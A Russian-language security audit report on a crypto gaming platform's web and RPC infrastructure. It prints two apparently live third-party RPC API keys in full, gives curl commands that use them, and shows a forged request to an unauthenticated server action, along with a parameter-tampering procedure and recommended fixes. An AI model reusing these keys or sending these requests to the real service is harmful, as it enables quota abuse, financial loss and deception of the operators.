# LootGO — Отчёт по безопасности

**Дата:** 2026-05-10  
**Цель:** production-инфраструктура LootGO (mainnet only)  
**Исследованные поверхности:** distribution.lootgo.app, mint.lootgo.app, lootgo.app, listmonk.lootgo.app, смарт-контракт Monad  

---

## Итог

| # | Название | Статус | Серьёзность |
|---|----------|--------|-------------|
| 1 | Helius RPC API ключ раскрыт в публичном JS | VALID | HIGH |
| 2 | DRPC Monad mainnet ключ раскрыт в публичном JS | VALID | HIGH |
| 3 | Уnauthenticated Server Action: подделка токен-заявок | VALID | MEDIUM |
| 4 | Client-controlled `isFree` флаг в mint flow | NEEDS VALIDATION | MEDIUM |
| 5 | listmonk Admin Panel + несколько CVE | NEEDS VALIDATION | HIGH (если уязвимая версия) |

---

## Находка 1: Helius Solana Mainnet RPC API Key — раскрытие в JS-бандле

### Статус: VALID

### Target
`distribution.lootgo.app/_next/static/chunks/app/layout-fddb78f871a1c844.js` (публичный файл)

### Доказательство production
Ключ получен из публичного JS-бандла Vercel-развёртывания `distribution.lootgo.app`.

```
https://mainnet.helius-rpc.com/?api-key=c525c510-e9ce-4c1f-a667-674f50e1b0a8
```

### Верификация
```bash
curl -X POST "https://mainnet.helius-rpc.com/?api-key=c525c510-e9ce-4c1f-a667-674f50e1b0a8" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","id":1,"method":"getHealth"}'
# → {"id":1,"jsonrpc":"2.0","result":"ok"}

curl -X POST "https://mainnet.helius-rpc.com/?api-key=c525c510-e9ce-4c1f-a667-674f50e1b0a8" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","id":1,"method":"getLatestBlockhash","params":[{"commitment":"finalized"}]}'
# → возвращает live slot 418804350 (Solana mainnet)
```

Ключ **активен** и даёт полный доступ к Solana mainnet RPC через инфраструктуру Helius.

### Сценарий атаки
1. Атакующий находит ключ в публичном JS (не требует аутентификации, не требует аккаунта)
2. Начинает массовые запросы к Helius RPC: `getAccountInfo`, `getProgramAccounts`, `sendTransaction`, DAS API (`getAsset`, `getAssetsByOwner`)
3. Исчерпывает квоту LootGO → `distribution.lootgo.app` перестаёт работать (отказ сервиса)
4. Использует ключ для собственных нужд за счёт LootGO (финансовый ущерб при платном плане)

### Требования атакующего
- Только браузер или curl
- Нет аккаунта, нет аутентификации

### Влияние
- DoS distribution.lootgo.app при исчерпании квоты
- Финансовые затраты LootGO (если Helius paid tier)
- Раскрытие on-chain данных спонсоров через DAS API
- Злоупотребление инфраструктурой от имени LootGO

### Безопасный PoC
```bash
curl -X POST "https://mainnet.helius-rpc.com/?api-key=c525c510-e9ce-4c1f-a667-674f50e1b0a8" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","id":1,"method":"getHealth"}'
# Ожидаемый результат: {"result":"ok"}
```

### Инвалидация
Невалидно, только если: ключ уже отозван Helius или это intentionally публичный dev-ключ (маловероятно для mainnet).

---

## Находка 2: DRPC Monad Mainnet RPC API Key — раскрытие в JS-бандле

### Статус: VALID

### Target
`mint.lootgo.app/_next/static/chunks/app/page-5397a372216cc921.js` (публичный файл)

### Доказательство production
Ключ встроен в page-bundle страницы COMPASS Genesis Mint на Monad mainnet.

```
https://lb.drpc.live/monad-mainnet/AjdokwrsjkmGnnhWBnuab--AZ4Xm00IR8KhbCqfUNZ5M
```

### Верификация
```bash
curl -X POST "https://lb.drpc.live/monad-mainnet/AjdokwrsjkmGnnhWBnuab--AZ4Xm00IR8KhbCqfUNZ5M" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","id":1,"method":"eth_blockNumber","params":[]}'
# → {"id":1,"jsonrpc":"2.0","result":"0x463d624"}  ← live Monad mainnet block
```

### Сценарий атаки
Идентичен Находке 1 для Monad mainnet:
1. Массовые `eth_call`, `eth_getLogs` запросы → исчерпание квоты DRPC
2. DoS mint.lootgo.app (не сможет читать on-chain данные)
3. Использование за счёт LootGO

### Влияние
- DoS mint.lootgo.app
- Финансовый ущерб при платном DRPC тарифе

---

## Находка 3: Unauthenticated Next.js Server Action — подделка заявок на distribution токенов

### Статус: VALID

### Target
`https://distribution.lootgo.app/` — Server Action `createTokenSubmission`  
Action ID: `40239f149970a2a85e3d932f102dab60adce33dec2`

### Описание
Страница `distribution.lootgo.app` позволяет токен-проектам отправить свои токены в адрес LootGO (`0x5523613D02d8555fF6F146f217be81D525E7e504`) и зарегистрировать заявку на распределение среди игроков.

Форма работает через Next.js Server Action. Server Action вызывается **без аутентификации** и **без верификации `tx_hash` на цепочке**. Все параметры передаются клиентом: `contract_address`, `token_amount`, `max_per_lootbox`, `tx_hash`.

Из JS-кода (`page-f9ee8f74fb1a6a30.js`):
```javascript
let i = createServerReference("40239f149970a2a85e3d932f102dab60adce33dec2", callServer, ..., "createTokenSubmission")
// ...
let r = {
  contract_address: a,      // ← клиент
  token_amount: l,           // ← клиент
  max_per_lootbox: c,        // ← клиент
  telegram_username: u,      // ← клиент
  email: b,                  // ← клиент
  tx_hash: t,                // ← клиент (НЕ ВЕРИФИЦИРУЕТСЯ)
  sender_address: ec,        // ← клиент
  token_symbol: G,           // ← клиент
  chain: e                   // ← клиент
};
let o = await i(r);  // Server Action вызов
```

### Верификация
```bash
# Вызов Server Action напрямую с полностью поддельными данными
curl -X POST "https://distribution.lootgo.app/" \
  -H "Next-Action: 40239f149970a2a85e3d932f102dab60adce33dec2" \
  -H "Content-Type: application/json" \
  -d '[{"contract_address":"0x0000000000000000000000000000000000000001",
       "token_amount":"1000000",
       "max_per_lootbox":"100",
       "telegram_username":"attacker",
       "email":"attacker@evil.com",
       "tx_hash":"0x0000000000000000000000000000000000000000000000000000000000000000",
       "sender_address":"0x0000000000000000000000000000000000000001",
       "token_symbol":"FAKE",
       "chain":"monad"}]'

# Ответ: 1:{"success":true}  ← ПОДТВЕРЖДЕНО
```

Ответ `{"success":true}` подтверждён при двух независимых вызовах с поддельным нулевым tx_hash.

### Требования атакующего
- Только curl / HTTP клиент
- Нет аккаунта, нет аутентификации

### Сценарий атаки
1. Атакующий массово отправляет поддельные заявки на distribution (spam)
2. Команда LootGO получает сотни "заявок" от несуществующих проектов с поддельными tx_hash
3. Без автоматической on-chain верификации команда тратит ресурсы на проверку
4. Целенаправленная атака: отправить заявку с реальным tx_hash конкурента (чужой транзакцией), имитировать легитимный deposit

### Влияние
- Операционный сбой (flooding review queue)
- Потенциальный social engineering: атакующий может использовать чужой tx_hash и выдать себя за другой проект
- Процесс ручной, поэтому прямая кража невозможна — но возможен обман операторов

### Инвалидация
Невалидно, только если: бэкенд дополнительно верифицирует tx_hash on-chain перед записью (не видно из JS-кода).

---

## Находка 4: Client-controlled `isFree` параметр в Mint Flow

### Статус: NEEDS VALIDATION — требует реального Privy аккаунта

### Target
`https://mint.lootgo.app/api/mint-intent` — генерация подписи для минта COMPASS NFT

### Описание
Флаг `isFree` определяется client-side и передаётся напрямую в тело запроса к `/api/mint-intent`. Аутентификация — через **httpOnly Privy cookie** (автоматически устанавливается браузером при логине через Privy SDK). Явного `Authorization` заголовка нет.

```javascript
// Из decompiled page-5397a372216cc921.js
let s = ei?.wallet?.address;          // адрес из Privy
let i = n ? eE : ec;                  // quantity: eE=free, ec=paid — КЛИЕНТ выбирает
let l = await fetch("/api/mint-intent", {
  method: "POST",
  headers: {"Content-Type": "application/json"},  // ← нет Authorization header
  // cookie отправляется автоматически браузером (httpOnly Privy cookie)
  body: JSON.stringify({address: s, quantity: i, email: L, isFree: n})  // ← isFree от клиента
});
// Ответ: {to, data, value} → готовая on-chain транзакция
```

### Результаты тестирования
- Без cookie → `{"success":false,"error":"Authentication token not found"}` (все варианты Cookie-заголовков проверены)
- Аутентификация через httpOnly cookie невозможна без реального завершения Privy OAuth flow (email/wallet)
- Нет возможности форжировать Privy session token без private key сервера Privy

### Механизм потенциальной атаки (при наличии аккаунта)
1. Создать аккаунт в mint.lootgo.app (email через Privy)
2. Получить httpOnly Privy session cookie через браузер
3. Interceptor (Burp/mitmproxy): изменить `isFree: false` → `isFree: true` и `quantity: 1 → eE` в запросе к mint-intent
4. Если сервер не делает независимую проверку eligibility → получить подпись для бесплатного минта
5. Отправить on-chain транзакцию с полученными `{to, data, value}`

### Оценка вероятности
**Высокая** — разделение eligibility-check (отдельный эндпоинт `/api/eligibility`) и mint-intent (отдельный эндпоинт) типично для уязвимого паттерна, где сервер доверяет флагу от клиента.

### Ограничения
COMPASS NFT: 3200/3210 выпущено (~10 осталось). Прямой ущерб минимален. Паттерн **критичен для любых будущих NFT дропов** LootGO на Monad.

### Инвалидация
Невалидно, если: `mint-intent` handler самостоятельно запрашивает eligibility из БД по адресу кошелька и игнорирует `isFree` из тела запроса.

---

## Находка 5: listmonk Admin Panel + CVE

### Статус: NEEDS VALIDATION (сервер недоступен)

### Target
`https://listmonk.lootgo.app/admin/login`

### Описание
DNS-запись существует, Cloudflare проксирует, но бэкенд возвращает `502 Bad Gateway`. LootGO использует Listmonk (open-source mailing list manager).

Актуальные CVE для Listmonk:

| CVE | CVSS | Версия | Описание |
|-----|------|--------|----------|
| CVE-2025-49136 | 9.1 | 4.0.0–5.0.1 | Template injection → чтение env vars (DB пароли, SMTP, admin creds). Требует low-priv аккаунт |
| CVE-2025-46011 | — | 2.4.0–4.1.0 | SQL injection в QuerySubscribers → escalation до superuser |
| CVE-2025-58430 | 8.6 | ≤1.1.0 | CSRF+XSS → создание admin аккаунта |
| CVE-2026-21483 | — | — | Stored XSS → admin account takeover |

### Статус валидации
Сервер (502) — невозможно определить версию и подтвердить exploitability без доступа к работающему инстансу. **При восстановлении сервера — приоритетно проверить CVE-2025-49136** (CVSS 9.1, требует только low-priv аккаунта в Listmonk).

---

## Инфраструктурные данные (не уязвимости)

| Данные | Значение | Место |
|--------|----------|-------|
| Privy App ID | `cmhyxyuwm00w8ie0d7rcmgpha` | mint.lootgo.app layout bundle |
| COMPASS контракт (Monad) | `0xa3522ea57c0bc48e602e2fe9f3929309d9618d96` | mint.lootgo.app page bundle |
| Distribution wallet (Monad) | `0x5523613D02d8555fF6F146f217be81D525E7e504` | distribution.lootgo.app page bundle |
| Helius RPC key | `c525c510-e9ce-4c1f-a667-674f50e1b0a8` | distribution.lootgo.app layout bundle |
| DRPC Monad key | `AjdokwrsjkmGnnhWBnuab--AZ4Xm00IR8KhbCqfUNZ5M` | mint.lootgo.app page bundle |

---

## Что не удалось найти

- **Production mobile API backend** — домен не обнаружен ни в JS-бандлах, ни через DNS enum. Частные репозитории (`lootgo-app`, `lootgo-api`) недоступны. Для полного аудита необходим доступ к APK или трафику мобильного приложения.
- **Уязвимости в COMPASS NFT контракте** — `mint()` использует signature verification с nonce. Верифицированный исходный код на monadscan.com недоступен напрямую. Поверхностный анализ ABI не выявил replay-атак (nonce-per-mint).
- **Quest/reward double-claim** — не обнаружены публичные эндпоинты для quest-системы. Вся логика в приватном backend.

---

## Рекомендации

1. **Немедленно:** отозвать Helius API ключ `c525c510-e9ce-4c1f-a667-674f50e1b0a8`
2. **Немедленно:** отозвать DRPC ключ `AjdokwrsjkmGnnhWBnuab--AZ4Xm00IR8KhbCqfUNZ5M`
3. **Срочно:** добавить on-chain верификацию `tx_hash` в `createTokenSubmission` Server Action (проверять, что транзакция реальная, от правильного sender, на правильный адрес, нужная сумма)
4. **Срочно:** добавить rate limiting и аутентификацию на Server Action distribution
5. **При восстановлении listmonk:** обновить до версии ≥5.0.2 (патч CVE-2025-49136)
6. **Для будущих mint-дропов:** сервер должен самостоятельно проверять eligibility при генерации подписи, не доверяя `isFree` флагу от клиента
7. **НИКОГДА** не встраивать RPC API ключи в клиентский JS — использовать server-side proxy
